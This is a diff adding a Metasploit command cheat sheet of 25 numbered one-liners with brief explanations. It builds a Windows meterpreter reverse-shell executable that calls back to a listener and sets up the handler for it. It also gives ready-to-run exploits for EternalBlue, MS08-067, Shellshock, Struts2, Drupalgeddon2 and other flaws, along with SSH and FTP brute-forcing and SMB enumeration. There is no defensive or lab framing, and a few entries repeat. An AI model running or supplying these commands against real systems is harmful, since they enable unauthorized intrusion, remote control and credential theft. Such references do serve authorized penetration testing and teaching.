@@ -1,0 +1,88 @@
+No. Command Explanation
+1 metasploit Launch the Metasploit framework
+for exploit development and
+execution.
+2 msfconsole Open the Metasploit console
+interface.
+3 msfvenom -p windows/meterpreter/reverse_tcp
+LHOST=192.168.1.2 LPORT=4444 -f exe > shell.exe
+Generate a Metasploit payload.
+4 msfconsole -r script.rc Run Metasploit commands from a
+script file.
+5 msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue;
+set RHOST 192.168.1.1; exploit"
+Exploit EternalBlue vulnerability.
+6 msfconsole -x "use exploit/multi/handler; set PAYLOAD
+windows/meterpreter/reverse_tcp; set LHOST 192.168.1.2; set
+LPORT 4444; exploit"
+Setup and run a multi-handler for
+reverse TCP payloads.
+7 msfconsole -x "use exploit/windows/smb/psexec; set RHOST
+192.168.1.1; set SMBUser user; set SMBPass pass; exploit"
+Exploit SMB with psexec.
+8 msfconsole -x "use auxiliary/scanner/portscan/tcp; set RHOSTS
+192.168.1.0/24; set THREADS 10; run"
+TCP port scan using Metasploit.
+9 msfconsole -x "use auxiliary/scanner/http/http_version; set
+RHOSTS 192.168.1.0/24; run"
+Scan HTTP versions on a network.
+10 msfconsole -x "use auxiliary/scanner/ftp/ftp_login; set RHOSTS
+192.168.1.0/24; set USER_FILE /path/to/users.txt; set PASS_FILE
+/path/to/passwords.txt; run"
+Brute-force FTP login.
+11 msfconsole -x "use auxiliary/scanner/ssh/ssh_login; set RHOSTS
+192.168.1.0/24; set USER_FILE /path/to/users.txt; set PASS_FILE
+/path/to/passwords.txt; run"
+Brute-force SSH login.
+12 msfconsole -x "use auxiliary/scanner/smb/smb_version; set
+RHOSTS 192.168.1.0/24; run"
+Scan SMB versions on a network.
+13 msfconsole -x "use auxiliary/scanner/smb/smb_enumshares; set
+RHOSTS 192.168.1.0/24; run"
+Enumerate SMB shares on a
+network.
+14 msfconsole -x "use auxiliary/scanner/smb/smb_enumusers; set
+RHOSTS 192.168.1.0/24; run"
+Enumerate SMB users on a
+network.
+15 msfconsole -x "use auxiliary/scanner/rdp/rdp_scanner; set RHOSTS
+192.168.1.0/24; run"
+Scan for RDP services on a
+network.
+16 msfconsole -x "use exploit/windows/smb/ms08_067_netapi; set
+RHOST 192.168.1.1; exploit"
+Exploit MS08-067 vulnerability.
+17 msfconsole -x "use exploit/unix/ftp/vsftpd_234_backdoor; set
+RHOST 192.168.1.1; exploit"
+Exploit vsftpd 2.3.4 backdoor.
+18 msfconsole -x "use exploit/windows/dcerpc/ms03_026_dcom; set
+RHOST 192.168.1.1; exploit"
+Exploit MS03-026 vulnerability.
+19 msfconsole -x "use exploit/windows/smb/psexec; set RHOST
+192.168.1.1; set SMBUser user; set SMBPass pass; exploit"
+Execute commands on Windows
+via SMB and psexec.
+20 msfconsole -x "use
+exploit/linux/http/apache_mod_cgi_bash_env_exec; set RHOST
+192.168.1.1; exploit"
+Exploit Shellshock vulnerability.
+21 msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue;
+set RHOST 192.168.1.1; exploit"
+Exploit EternalBlue vulnerability.
+22 msfconsole -x "use exploit/multi/http/struts2_content_type_ognl;
+set RHOST 192.168.1.1; exploit"
+Exploit Struts2 Content-Type
+OGNL injection.
+23 msfconsole -x "use exploit/unix/webapp/drupal_drupalgeddon2;
+set RHOST 192.168.1.1; exploit"
+Exploit Drupalgeddon2
+vulnerability.
+24 msfconsole -x "use exploit/multi/php/php_cgi_arg_injection; set
+RHOST 192.168.1.1; exploit"
+Exploit PHP CGI Argument
+Injection.
+25 msfconsole -x "use
+exploit/windows/browser/ms14_064_ole_code_execution; set
+RHOST 192.168.1.1; exploit"
+Exploit MS14-064 OLE Code
+Execution.
